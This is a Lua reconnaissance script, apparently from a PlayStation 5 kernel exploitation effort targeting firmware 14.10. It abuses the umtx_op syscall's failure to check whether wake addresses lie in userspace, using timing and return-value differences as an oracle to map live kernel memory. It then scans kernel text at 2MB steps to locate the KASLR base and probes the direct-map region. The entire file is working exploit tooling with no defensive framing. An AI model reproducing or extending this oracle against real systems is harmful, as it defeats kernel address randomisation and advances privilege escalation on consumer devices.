-- 14.10 Recon Probe 13: NWAKE_PRIVATE kernel address oracle
-- Finding: kernel doesn't validate that wake addresses are userspace
-- Strategy: pass kernel addresses in the NWAKE pointer array and measure
-- timing/return differences to map live kernel memory regions
-- PS5 kernel: FreeBSD amd64 — kernel text at 0xFFFFFFFF8xxxxxxx,
-- DMAP at 0xFFFFF800xxxxxxxx, kernel heap in between

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: NWAKE KERNEL ORACLE ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_umtx_op = 557,
    sc_mmap = 477,
    sc_getpid = 20,
    sc_nanosleep = 240,
    sc_clock_gettime = 232,
})

local UMTX_OP_NWAKE_PRIVATE = 21
local UMTX_OP_WAKE_PRIVATE = 16

-- High-precision timer using clock_gettime(CLOCK_MONOTONIC)
local CLOCK_MONOTONIC = 4
local ts_buf = memory.alloc(16)

local function get_ns()
    syscall.sc_clock_gettime(CLOCK_MONOTONIC, ts_buf)
    local sec = memory.read_qword(ts_buf):tonumber()
    local nsec = memory.read_qword(ts_buf + 8):tonumber()
    return sec * 1000000000 + nsec
end

-- ============================================================
-- PART 1: Baseline timing — userspace vs kernel addresses
-- ============================================================
log("")
log("--- PART 1: timing baseline ---")

local wake_array = memory.alloc(4096)
local valid_addr = memory.alloc(64)
memory.write_dword(valid_addr, 0)

-- Warm up
for i = 1, 100 do
    memory.write_qword(wake_array, valid_addr)
    pcall(function() syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0) end)
end

-- Measure userspace address (1000 iterations)
local user_times = {}
for i = 1, 1000 do
    memory.write_qword(wake_array, valid_addr)
    local t0 = get_ns()
    pcall(function() syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0) end)
    local t1 = get_ns()
    user_times[#user_times + 1] = t1 - t0
end

-- Sort and get median
table.sort(user_times)
local user_median = user_times[500]
local user_min = user_times[1]
local user_max = user_times[1000]
log(string.format("  userspace addr: min=%d med=%d max=%d ns", user_min, user_median, user_max))

-- Measure kernel text address
local kern_times = {}
for i = 1, 1000 do
    memory.write_qword(wake_array, 0xFFFFFFFF82200000) -- typical kernel text
    local t0 = get_ns()
    pcall(function() syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0) end)
    local t1 = get_ns()
    kern_times[#kern_times + 1] = t1 - t0
end
table.sort(kern_times)
log(string.format("  kernel text:    min=%d med=%d max=%d ns", kern_times[1], kern_times[500], kern_times[1000]))

-- Measure unmapped kernel address
local unmap_times = {}
for i = 1, 1000 do
    memory.write_qword(wake_array, 0xDEAD000000000000) -- definitely unmapped
    local t0 = get_ns()
    pcall(function() syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0) end)
    local t1 = get_ns()
    unmap_times[#unmap_times + 1] = t1 - t0
end
table.sort(unmap_times)
log(string.format("  unmapped:       min=%d med=%d max=%d ns", unmap_times[1], unmap_times[500], unmap_times[1000]))

-- Measure NULL address
local null_times = {}
for i = 1, 1000 do
    memory.write_qword(wake_array, 0)
    local t0 = get_ns()
    pcall(function() syscall.sc_umtx_op(wake_array, UMTX_OP_NWAKE_PRIVATE, 1, 0, 0, 0) end)
    local t1 = get_ns()
    null_times[#null_times + 1] = t1 - t0
end
table.sort(null_times)
log(string.format("  NULL:           min=%d med=%d max=%d ns", null_times[1], null_times[500], null_times[1000]))

-- ============================================================
-- PART 2: Also test UMTX_OP_WAKE_PRIVATE directly
-- (simpler path, single address, might be faster to measure)
-- ============================================================
log("")
log("--- PART 2: WAKE_PRIVATE single-addr oracle ---")

-- Warm up
for i = 1, 100 do
    pcall(function() syscall.sc_umtx_op(valid_addr, UMTX_OP_WAKE_PRIVATE, 1, 0, 0, 0) end)
end

local function measure_wake(addr, label, count)
    local times = {}
    for i = 1, count do
        local t0 = get_ns()
        pcall(function() syscall.sc_umtx_op(addr, UMTX_OP_WAKE_PRIVATE, 1, 0, 0, 0) end)
        local t1 = get_ns()
        times[#times + 1] = t1 - t0
    end
    table.sort(times)
    local mid = math.floor(count / 2)
    log(string.format("  %-24s min=%d med=%d max=%d ns", label,
        times[1], times[mid], times[count]))
    return times[mid]
end

measure_wake(valid_addr, "userspace", 1000)
measure_wake(0xFFFFFFFF82200000, "kernel text", 1000)
measure_wake(0xFFFFF80000000000, "DMAP base", 1000)
measure_wake(0xDEAD000000000000, "unmapped high", 1000)
measure_wake(0, "NULL", 1000)
measure_wake(1, "addr=1", 1000)

-- ============================================================
-- PART 3: Kernel text scan
-- FreeBSD amd64 kernel loads at 0xFFFFFFFF80200000 typically
-- PS5 may randomize (KASLR). Scan at 2MB intervals to find
-- where timing changes — indicates mapped kernel page.
-- ============================================================
log("")
log("--- PART 3: kernel text KASLR scan ---")

-- Scan 0xFFFFFFFF80000000 to 0xFFFFFFFF90000000 at 2MB steps
local SCAN_BASE = 0xFFFFFFFF80000000
local SCAN_END  = 0xFFFFFFFF90000000
local STEP = 0x200000 -- 2MB

local scan_results = {}
for addr = SCAN_BASE, SCAN_END, STEP do
    local times = {}
    for i = 1, 200 do
        local t0 = get_ns()
        pcall(function() syscall.sc_umtx_op(addr, UMTX_OP_WAKE_PRIVATE, 1, 0, 0, 0) end)
        local t1 = get_ns()
        times[#times + 1] = t1 - t0
    end
    table.sort(times)
    local med = times[100]
    scan_results[#scan_results + 1] = {addr = addr, med = med}
end

-- Sort by timing to find outliers
table.sort(scan_results, function(a, b) return a.med < b.med end)
log("  fastest (possibly mapped):")
for i = 1, math.min(10, #scan_results) do
    local r = scan_results[i]
    log(string.format("    0x%016x: %d ns", r.addr, r.med))
end
log("  slowest (possibly unmapped):")
for i = math.max(1, #scan_results - 4), #scan_results do
    local r = scan_results[i]
    log(string.format("    0x%016x: %d ns", r.addr, r.med))
end

-- ============================================================
-- PART 4: DMAP scan
-- DMAP maps all physical memory at a fixed virtual offset
-- Typically 0xFFFFF80000000000 on FreeBSD amd64
-- PS5 has 16GB RAM, so DMAP goes to +0x400000000
-- ============================================================
log("")
log("--- PART 4: DMAP region scan ---")

local DMAP_BASE = 0xFFFFF80000000000
local DMAP_END  = 0xFFFFF80400000000 -- +16GB
local DMAP_STEP = 0x40000000 -- 1GB steps

local dmap_results = {}
for addr = DMAP_BASE, DMAP_END, DMAP_STEP do
    local times = {}
    for i = 1, 200 do
        local t0 = get_ns()
        pcall(function() syscall.sc_umtx_op(addr, UMTX_OP_WAKE_PRIVATE, 1, 0, 0, 0) end)
        local t1 = get_ns()
        times[#times + 1] = t1 - t0
    end
    table.sort(times)
    local med = times[100]
    dmap_results[#dmap_results + 1] = {addr = addr, med = med}
    log(string.format("  0x%016x: %d ns", addr, med))
end

-- ============================================================
-- PART 5: Return value analysis
-- Does the kernel return different values for mapped vs unmapped?
-- ============================================================
log("")
log("--- PART 5: return value analysis ---")

local function check_rv(addr, label)
    local ok, ret = pcall(function()
        return syscall.sc_umtx_op(addr, UMTX_OP_WAKE_PRIVATE, 1, 0, 0, 0)
    end)
    if ok then
        log(string.format("  %-30s rv=%d", label, ret:tonumber()))
    else
        log(string.format("  %-30s ERR: %s", label, tostring(ret):sub(1, 40)))
    end
end

check_rv(valid_addr, "userspace valid")
check_rv(0, "NULL")
check_rv(1, "addr=1")
check_rv(0x1000, "addr=0x1000")
check_rv(0xFFFFFFFF80200000, "kern text +200000")
check_rv(0xFFFFFFFF82000000, "kern text +2000000")
check_rv(0xFFFFFFFF84000000, "kern text +4000000")
check_rv(0xFFFFFFFF90000000, "kern high")
check_rv(0xFFFFF80000000000, "DMAP base")
check_rv(0xFFFFF80100000000, "DMAP +4GB")
check_rv(0xFFFFF80200000000, "DMAP +8GB")
check_rv(0xFFFFF80400000000, "DMAP +16GB")
check_rv(0xFFFFF80800000000, "DMAP +32GB (past RAM)")
check_rv(0xDEAD000000000000, "unmapped high")
check_rv(0xFFFF800000000000, "kernel base")

log("")
log("=== NWAKE ORACLE DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
